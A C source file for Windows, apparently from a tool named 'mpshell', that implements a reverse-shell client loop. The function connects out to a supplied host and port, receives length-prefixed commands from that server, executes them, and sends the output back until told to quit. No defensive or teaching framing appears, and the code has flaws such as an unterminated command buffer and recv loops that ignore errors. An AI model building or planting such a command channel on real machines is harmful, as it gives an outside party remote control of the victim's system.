#include "mpshell.h"

extern mp_result_buffer *result_buffer;
extern bool RUN;

int open_tcp_channel(const char *host, const char *port)
{
    int status;
    WSADATA wsa_data;
    SOCKET sockfd = INVALID_SOCKET;
    struct addrinfo *result = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    ssize_t total_bytes_sent;
    ssize_t num_bytes_sent;
    ssize_t total_bytes_read;
    ssize_t num_bytes_read;

    status = WSAStartup(MAKEWORD(2,2), &wsa_data);
    if (status != 0)
    {
        printf("[ERROR] WSAStartup failed => %d\n", status);
        return EXIT_FAILURE;
    }

    status = getaddrinfo(host, port, &hints, &result);
    if (status != 0)
    {
        printf("[ERROR] getaddrinfo failed => %d\n", status);
        WSACleanup();
        return EXIT_FAILURE;
    }

    sockfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sockfd == INVALID_SOCKET)
    {
        printf("[ERROR] => socket creation failed: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        return EXIT_FAILURE;
    }

    status = connect(sockfd, result->ai_addr, (int)result->ai_addrlen);
    if (status == SOCKET_ERROR)
    {
        printf("[ERROR] Could not connect to server => ");
        closesocket(sockfd);
        freeaddrinfo(result);
        WSACleanup();
        return EXIT_FAILURE;
    }

    while (RUN)
    {
        // Read command from the server
        uint32_t temp;
        if ((recv(sockfd, &temp, 4, 0)) < 4)
            break;

        total_bytes_read        = 0;
        num_bytes_read          = 0;
        uint32_t command_length = ntohl(temp);
        char command[command_length+5];
        while (total_bytes_read < command_length)
        {
            num_bytes_read = recv(sockfd, &command[total_bytes_read], (command_length-total_bytes_read), 0);
            if (num_bytes_read > 0)
                total_bytes_read += num_bytes_read;
        }

        // Run the command
        if ((strcmp(command, "quit") == 0) || (strcmp(command, "exit") == 0))
            break;

        execute_command(command);

        // Send the result back to server
        uint32_t result_length = htonl(result_buffer->num_bytes_occupied);
        if ((send(sockfd, &result_length, 4, 0)) < 4)
            break;

        total_bytes_sent = 0;
        num_bytes_sent   = 0;
        while (total_bytes_sent < result_buffer->num_bytes_occupied)
        {
            num_bytes_sent = send(sockfd, &result_buffer->data[total_bytes_sent], ((result_buffer->num_bytes_occupied)-total_bytes_sent), 0);
            if (num_bytes_sent > 0)
                total_bytes_sent += num_bytes_sent;
        }

        result_buffer->num_bytes_occupied = 0;
    }

    closesocket(sockfd);
    freeaddrinfo(result);
    WSACleanup();
    return EXIT_SUCCESS;
}
